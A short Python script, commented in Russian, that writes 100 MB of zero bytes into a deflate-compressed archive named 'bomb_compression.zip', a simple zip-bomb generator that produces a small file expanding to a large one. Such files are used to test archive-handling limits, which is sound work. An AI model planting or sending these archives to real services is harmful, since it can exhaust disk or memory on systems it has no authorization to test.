import zipfile

# Создаем файл с повторяющимися данными (хорошо сжимается)
data = b'0' * (100 * 1024 * 1024)  # 100MB нулей

with zipfile.ZipFile('bomb_compression.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    # Указываем большой размер, но реально сжимаемся до маленького
    zf.writestr('bomb.txt', data)